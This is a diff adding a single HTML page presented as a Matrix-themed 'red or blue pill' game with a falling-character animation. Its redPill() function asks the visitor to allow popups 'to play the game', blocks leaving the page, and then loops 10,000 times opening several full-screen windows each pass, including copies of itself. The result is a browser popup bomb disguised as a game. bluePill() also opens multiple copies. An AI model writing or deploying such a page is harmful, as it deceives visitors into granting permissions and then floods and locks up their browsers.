@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="title" content="Matrix"/>
+    <meta name="og:title" content="Matrix"/>
+    <meta name="og:description" content="Red or Blue?"/>
+    <meta name="og:type" content="website"/>
+    <meta name="og:url" content="https://182exe.github.io/matrix"/>
+    <meta name="og:image" content="https://raw.githubusercontent.com/google/material-design-icons/master/png/social/sentiment_very_dissatisfied/materialiconstwotone/24dp/1x/twotone_sentiment_very_dissatisfied_black_24dp.png"/>
+    <link rel="shortcut icon" type="image/jpg" href="https://raw.githubusercontent.com/google/material-design-icons/master/png/social/sentiment_very_dissatisfied/materialiconstwotone/24dp/1x/twotone_sentiment_very_dissatisfied_black_24dp.png"/>
+    <link rel="icon" type="image/jpg" href="https://raw.githubusercontent.com/google/material-design-icons/master/png/social/sentiment_very_dissatisfied/materialiconstwotone/24dp/1x/twotone_sentiment_very_dissatisfied_black_24dp.png"/>
+    <title>Matrix</title>
+    <style>
+      body {
+        background: black;
+      }
+      .buttonred {
+        background: red;
+        font-family: monospace;
+        color: black;
+        width: 10%;
+        padding: 10px;
+        border: 3px solid red;
+        display: block;
+        margin-right: auto;
+        margin-left: auto;
+        transition: 0.3s ease-in-out;
+        border-radius: 20px;
+        font-size: 20px;
+      }
+      .buttonblue {
+        background: blue;
+        font-family: monospace;
+        color: black;
+        width: 10%;
+        padding: 10px;
+        display: block;
+        margin-right: auto;
+        border: 3px solid blue;
+        margin-left: auto;
+        transition: 0.3s ease-in-out;
+        border-radius: 20px;
+        font-size: 20px;
+      }
+      .buttonred:hover {
+        background: black;
+        font-family: monospace;
+        color: red;
+        width: 15%;
+        border: 3px solid red;
+        padding: 10px;
+        transition: 0.5s ease;
+        text-shadow:0px 0px 6px red;
+        box-shadow: 0px 0px 6px red;
+        border-radius: 20px;
+        animation: fly 1s;
+        transition: 0.3s ease-in-out;
+      }
+      .buttonblue:hover {
+        background: black;
+        font-family: monospace;
+        color: blue;
+        width: 15%;
+        border: 3px solid blue;
+        padding: 10px;
+        transition: 0.5s ease;
+        text-shadow:0px 0px 6px blue;
+        box-shadow: 0px 0px 6px blue;
+        border-radius: 20px;
+        animation: fly 1s;
+        transition: 0.3s ease-in-out;
+      }
+      .text {
+        color: white;
+        text-shadow: 0px 0px 8px white;
+        font-family: monospace;
+        font-size: 40px;
+        text-align: center;
+        transition: 0.5s ease;
+      }
+      .text2 {
+        color: white;
+        text-shadow: 0px 0px 4px white;
+        font-family: monospace;
+        font-size: 20px;
+        text-align: center;
+        transition: 0.5s ease;
+      }
+      .text:hover {
+        letter-spacing: 15px;
+        animation: down 1s;
+        transition: 0.5s ease;
+      }
+      .text2:hover {
+        letter-spacing: 10px;
+        animation: down 1s;
+        transition: 0.5s ease;
+      }
+      @keyframes fly {
+        0% { transform: translate(0px,0px) rotate(0deg); }
+        25% { transform: translate(2px,0px) rotate(0deg); }
+        50% { transform: translate(-2px,0px) rotate(0deg); }
+        75% { transform: translate(0px 0px) rotate(0deg); }
+        100% { transform: translate(0px,0px) rotate(0deg); }
+      }
+      @keyframes down {
+        0% { transform: translate(0px,0px) rotate(0deg); }
+        25% { transform: translate(0px,1px) rotate(0deg); }
+        50% { transform: translate(0px,-1px) rotate(0deg); }
+        75% { transform: translate(0px 0px) rotate(0deg); }
+        100% { transform: translate(0px,0px) rotate(0deg); }
+      }
+      .canvas {
+        positon: absolute;
+      }
+    </style>
+  </head>
+  <body>
+  <div>
+  <br>
+  <h1 class="text">matrix</h1>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <button class="buttonred" onclick="javascript:redPill()">Red</button>
+  <br>
+  <h2 class="text2">Chose Wisely.</h2>
+  <br>
+  <button class="buttonblue" onclick="javascript:bluePill()">Blue</button>
+  </div>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <canvas class="canvas" width="auto" height="500" id="canv"></canvas>
+    <script>
+    var url = window.location.pathname;
+      function getRandomInt(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min) + min);
+      }
+      var randomNumber = getRandomInt(0,9);
+      function redPill() {
+        if (confirm("Are you sure?")) {
+          window.alert("Please allow popups on this website to play the game!")
+          window.addEventListener('keydown', (e) => {
+            console.log(e)
+          })
+          window.dispatchEvent(new KeyboardEvent('keydown', {
+            'key': 'a'
+          }));
+          window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = '';
+          });
+          var fakeWindow = window.open("",);
+          for (let i=0; i<10000; i++) {
+            var spamWindow = window.open(randomLink, "", "width=1920, height=1080");
+            var inTabWindow = window.open("", "");
+            var smallWindow = window.open("https://182exe.github.io/matrix", "", "width=1920,height=1080");
+            var randomNumber = getRandomInt(0,9);
+            var randomLink = 'https://www.google.com/search?q=' + randomNumber
+            var openMass = window.open("https://182exe.github.io/matrix/666.html", "", "1920px", "1080px");
+            for (let i=0; i<5; i++) {
+              var randomLink = randomLink + randomNumber
+              var randomNumber = getRandomInt(100,999);
+            }
+            var randomLink = 'https://www.google.com/search?q='
+          }
+        } else {
+          window.alert("All right. Try again when you're ready.")
+        }
+      }
+      function bluePill() {
+        window.alert("Please allow popups on this website to play the game!")
+        if (confirm("Are you sure?")) {
+          for (let i=0; i<5; i++) {
+            var smallWindow = window.open(url, "", "width=1920,height=1080");
+          }
+        } else {
+          window.alert("All right. Try again when you're ready.")
+        }
+      }
+    // Get the canvas node and the drawing context
+    const canvas = document.getElementById('canv');
+    const ctx = canvas.getContext('2d');
+    
+    // set the width and height of the canvas
+    const w = canvas.width = document.body.offsetWidth;
+    const h = canvas.height = document.body.offsetWidth;
+    
+    // draw a black rectangle of width and height same as that of the canvas
+    ctx.fillStyle = '#000';
+    ctx.fillRect(0, 0, w, h);
+    const cols = Math.floor(w / 20) + 1;
+    const ypos = Array(cols).fill(0);
+    function matrix () {
+      // Draw a semitransparent black rectangle on top of previous drawing
+      ctx.fillStyle = '#0001';
+      ctx.fillRect(0, 0, w, h);
+    
+      // Set color to green and font to 15pt monospace in the drawing context
+      ctx.fillStyle = '#0f0';
+      ctx.font = '15pt monospace';
+    
+      // for each column put a random character at the end
+      ypos.forEach((y, ind) => {
+        // generate a random character
+        const text = String.fromCharCode(Math.random() * 128);
+    
+        // x coordinate of the column, y coordinate is already given
+        const x = ind * 20;
+        // render the character at (x, y)
+        ctx.fillText(text, x, y);
+    
+        // randomly reset the end of the column if it's at least 100px high
+        if (y > 100 + Math.random() * 10000) ypos[ind] = 0;
+        // otherwise just move the y coordinate for the column 20px down,
+        else ypos[ind] = y + 20;
+      });
+    }
+    
+    // render the animation at 20 FPS.
+    setInterval(matrix, 50);
+  </script>
+  </body>
+</html>
